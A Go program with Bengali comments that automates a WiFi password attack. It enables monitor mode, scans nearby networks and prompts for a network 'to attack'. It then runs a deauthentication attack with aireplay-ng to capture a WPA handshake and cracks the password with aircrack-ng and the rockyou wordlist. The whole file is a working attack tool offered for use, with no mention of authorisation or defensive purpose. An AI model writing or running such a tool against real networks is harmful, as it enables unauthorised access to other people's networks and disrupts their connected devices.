package main

import (
    "bufio"
    "fmt"
    "os"
    "os/exec"
    "strings"
    "time"
)

type Network struct {
    BSSID  string
    CH     string
    ESSID  string
    Sec    string
    Client string
}

func main() {
    // রুট চেক
    if os.Geteuid() != 0 {
        fmt.Println("❌ এই টুলটি রান করতে অবশ্যই sudo ব্যবহার করুন!")
        os.Exit(1)
    }

    reader := bufio.NewReader(os.Stdin)

    // ১. ইন্টারফেস ইনপুট নেওয়া
    fmt.Print("আপনার ওয়াইফাই ইন্টারফেসের নাম দিন (যেমন: wlp1s0): ")
    iface, _ := reader.ReadString('\n')
    iface = strings.TrimSpace(iface)
    monIface := iface + "mon"

    fmt.Println("\n[*] Monitor Mode চালু করা হচ্ছে...")
    runCmd("airmon-ng", "check", "kill")
    runCmd("airmon-ng", "start", iface)

    // ২. স্ক্যানিং এবং নেটওয়ার্ক লিস্ট দেখানো
    fmt.Println("\n[*] ১৫ সেকেন্ডের জন্য নেটওয়ার্ক স্ক্যান করা হচ্ছে...")
    scanFile := "scan_temp"
    // ব্যাকগ্রাউন্ডে airodump চালু করা
    airodumpCmd := exec.Command("airodump-ng", monIface, "-w", scanFile, "--output-format", "csv")
    airodumpCmd.Start()
    time.Sleep(15 * time.Second) // ১৫ সেকেন্ড স্ক্যান
    airodumpCmd.Process.Kill()   // স্ক্যান বন্ধ করা
    fmt.Println("[*] স্ক্যান সম্পন্ন হয়েছে।")

    // CSV ফাইল পার্স করে নেটওয়ার্ক বের করা
    networks := parseCSV(scanFile + "-01.csv")
    if len(networks) == 0 {
        fmt.Println("❌ কোনো নেটওয়ার্ক পাওয়া যায়নি বা CSV ফাইল তৈরি হয়নি।")
        os.Exit(1)
    }

    fmt.Println("\n=== পাওয়া ওয়াইফাই নেটওয়ার্ক ===")
    for i, net := range networks {
        fmt.Printf("[%d] ESSID: %s | BSSID: %s | CH: %s | Security: %s\n", i+1, net.ESSID, net.BSSID, net.CH, net.Sec)
    }

    // ৩. টার্গেট সিলেক্ট করা
    fmt.Print("\nআক্রমণ করার জন্য নেটওয়ার্কের নাম্বার দিন: ")
    var choice int
    fmt.Scanf("%d", &choice)

    if choice < 1 || choice > len(networks) {
        fmt.Println("❌ ভুল নাম্বার!")
        os.Exit(1)
    }
    target := networks[choice-1]

    fmt.Printf("\n[*] টার্গেট নির্বাচিত: %s (%s)\n", target.ESSID, target.BSSID)
    capFile := strings.ReplaceAll(target.ESSID, " ", "_") + "_handshake"

    // ৪. Handshake ক্যাপচার ও Deauth Attack (একসাথে)
    fmt.Println("[*] Handshake ক্যাপচার চালু করা হচ্ছে...")
    captureCmd := exec.Command("airodump-ng", "-c", target.CH, "--bssid", target.BSSID, "-w", capFile, monIface)
    captureCmd.Start()

    fmt.Println("[*] Deauth attack শুরু হচ্ছে (১০ সেকেন্ড)...")
    deauthArgs := []string{"--deauth", "10", "-a", target.BSSID, monIface}
    if target.Client != "" {
        deauthArgs = append(deauthArgs, "-c", target.Client)
    }
    runCmd("aireplay-ng", deauthArgs...)

    time.Sleep(5 * time.Second) // হ্যান্ডশেক সেভ হওয়ার জন্য অপেক্ষা
    captureCmd.Process.Kill()
    fmt.Println("[*] ক্যাপচার সম্পন্ন।")

    // ৫. Password Crack করা
    finalCapFile := capFile + "-01.cap"
    fmt.Printf("[*] %s ফাইল দিয়ে পাসওয়ার্ড ক্র্যাক করা হচ্ছে...\n", finalCapFile)
    runCmd("aircrack-ng", "-w", "/usr/share/wordlists/rockyou.txt", finalCapFile)

    // ক্লিনআপ
    os.Remove(scanFile + "-01.csv")
}

// কমান্ড রান করার হেল্পার ফাংশন
func runCmd(name string, args ...string) {
    cmd := exec.Command(name, args...)
    cmd.Stdout = os.Stdout
    cmd.Stderr = os.Stderr
    cmd.Run()
}

// airodump-ng এর CSV ফাইল পার্স করার ফাংশন
func parseCSV(filename string) []Network {
    file, err := os.Open(filename)
    if err != nil {
        return nil
    }
    defer file.Close()

    var networks []Network
    scanner := bufio.NewScanner(file)
    isStation := false

    for scanner.Scan() {
        line := scanner.Text()
        if strings.Contains(line, "Station MAC") {
            isStation = true
            continue
        }

        parts := strings.Split(line, ",")
        if len(parts) < 14 {
            continue
        }

        if !isStation {
            bssid := strings.TrimSpace(parts[0])
            ch := strings.TrimSpace(parts[3])
            sec := strings.TrimSpace(parts[5])
            essid := strings.TrimSpace(parts[13])
            if bssid != "" && essid != "" {
                networks = append(networks, Network{
                    BSSID: bssid,
                    CH:    ch,
                    ESSID: essid,
                    Sec:   sec,
                })
            }
        } else {
            // কানেক্টেড ক্লায়েন্ট বের করা
            stationMac := strings.TrimSpace(parts[0])
            targetBSSID := strings.TrimSpace(parts[5])
            for i := range networks {
                if networks[i].BSSID == targetBSSID && networks[i].Client == "" {
                    networks[i].Client = stationMac
                    break
                }
            }
        }
    }
    return networks
}